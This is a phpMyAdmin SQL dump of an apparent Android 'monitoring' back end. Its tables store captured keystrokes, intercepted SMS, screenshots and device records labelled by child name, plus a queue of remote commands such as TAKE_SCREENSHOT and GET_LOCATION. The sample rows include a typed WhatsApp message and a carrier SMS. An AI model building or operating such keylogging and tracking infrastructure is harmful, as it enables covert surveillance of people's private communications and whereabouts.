-- phpMyAdmin SQL Dump
-- version 4.9.0.1
-- https://www.phpmyadmin.net/
--
-- Host: sql301.infinityfree.com
-- Generation Time: 19 مايو 2026 الساعة 10:56
-- إصدار الخادم: 11.4.10-MariaDB
-- PHP Version: 7.2.22

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `if0_41922795_monitoring_db`
--

-- --------------------------------------------------------

--
-- بنية الجدول `commands`
--

CREATE TABLE `commands` (
  `id` int(11) NOT NULL,
  `device_id` int(11) DEFAULT NULL,
  `command` varchar(100) NOT NULL,
  `status` enum('pending','executed','failed') DEFAULT 'pending',
  `created_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- إرجاع أو استيراد بيانات الجدول `commands`
--

INSERT INTO `commands` (`id`, `device_id`, `command`, `status`, `created_at`) VALUES
(1, 1, 'TAKE_SCREENSHOT', 'pending', '2026-05-15 13:35:12'),
(2, 1, 'GET_LOCATION', 'pending', '2026-05-15 13:42:59');

-- --------------------------------------------------------

--
-- بنية الجدول `devices`
--

CREATE TABLE `devices` (
  `id` int(11) NOT NULL,
  `device_unique_id` varchar(100) NOT NULL,
  `child_name` varchar(50) DEFAULT NULL,
  `android_version` varchar(20) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `last_seen` timestamp NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- إرجاع أو استيراد بيانات الجدول `devices`
--

INSERT INTO `devices` (`id`, `device_unique_id`, `child_name`, `android_version`, `created_at`, `last_seen`) VALUES
(1, 'TEST_999_XYZ', 'Ahmed_Phone', 'Android 13', '2026-05-15 12:05:12', '2026-05-15 12:05:12');

-- --------------------------------------------------------

--
-- بنية الجدول `key_logs`
--

CREATE TABLE `key_logs` (
  `id` int(11) NOT NULL,
  `device_id` int(11) DEFAULT NULL,
  `app_name` varchar(100) DEFAULT NULL,
  `typed_text` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- إرجاع أو استيراد بيانات الجدول `key_logs`
--

INSERT INTO `key_logs` (`id`, `device_id`, `app_name`, `typed_text`, `created_at`) VALUES
(1, 1, 'WhatsApp', 'أين أنت يا صديقي؟ أنا في جامعة تعز الآن.', '2026-05-15 12:56:24');

-- --------------------------------------------------------

--
-- بنية الجدول `screenshots`
--

CREATE TABLE `screenshots` (
  `id` int(11) NOT NULL,
  `device_id` int(11) DEFAULT NULL,
  `image_path` varchar(255) NOT NULL,
  `captured_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- إرجاع أو استيراد بيانات الجدول `screenshots`
--

INSERT INTO `screenshots` (`id`, `device_id`, `image_path`, `captured_at`) VALUES
(1, 1, 'uploads/screen_1778850272_6a0719e0a5ca3.png', '2026-05-15 13:04:32');

-- --------------------------------------------------------

--
-- بنية الجدول `sms_logs`
--

CREATE TABLE `sms_logs` (
  `id` int(11) NOT NULL,
  `device_id` int(11) DEFAULT NULL,
  `sender` varchar(50) DEFAULT NULL,
  `message_body` text DEFAULT NULL,
  `received_at` datetime DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- إرجاع أو استيراد بيانات الجدول `sms_logs`
--

INSERT INTO `sms_logs` (`id`, `device_id`, `sender`, `message_body`, `received_at`, `created_at`) VALUES
(1, 1, 'Yemen Mobile', 'مرحباً مرتضى، تم تفعيل باقة الإنترنت بنجاح.', NULL, '2026-05-15 12:48:00'),
(2, 1, 'Yemen Mobile', 'مرحباً مرتضى، تم تفعيل باقة الإنترنت بنجاح.', NULL, '2026-05-15 12:48:00');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`),
  ADD KEY `device_id` (`device_id`);

--
-- Indexes for table `devices`
--
ALTER TABLE `devices`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `device_unique_id` (`device_unique_id`);

--
-- Indexes for table `key_logs`
--
ALTER TABLE `key_logs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `device_id` (`device_id`);

--
-- Indexes for table `screenshots`
--
ALTER TABLE `screenshots`
  ADD PRIMARY KEY (`id`),
  ADD KEY `device_id` (`device_id`);

--
-- Indexes for table `sms_logs`
--
ALTER TABLE `sms_logs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `device_id` (`device_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `devices`
--
ALTER TABLE `devices`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `key_logs`
--
ALTER TABLE `key_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `screenshots`
--
ALTER TABLE `screenshots`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `sms_logs`
--
ALTER TABLE `sms_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- قيود الجداول المحفوظة
--

--
-- القيود للجدول `commands`
--
ALTER TABLE `commands`
  ADD CONSTRAINT `commands_ibfk_1` FOREIGN KEY (`device_id`) REFERENCES `devices` (`id`) ON DELETE CASCADE;

--
-- القيود للجدول `key_logs`
--
ALTER TABLE `key_logs`
  ADD CONSTRAINT `key_logs_ibfk_1` FOREIGN KEY (`device_id`) REFERENCES `devices` (`id`) ON DELETE CASCADE;

--
-- القيود للجدول `screenshots`
--
ALTER TABLE `screenshots`
  ADD CONSTRAINT `screenshots_ibfk_1` FOREIGN KEY (`device_id`) REFERENCES `devices` (`id`) ON DELETE CASCADE;

--
-- القيود للجدول `sms_logs`
--
ALTER TABLE `sms_logs`
  ADD CONSTRAINT `sms_logs_ibfk_1` FOREIGN KEY (`device_id`) REFERENCES `devices` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
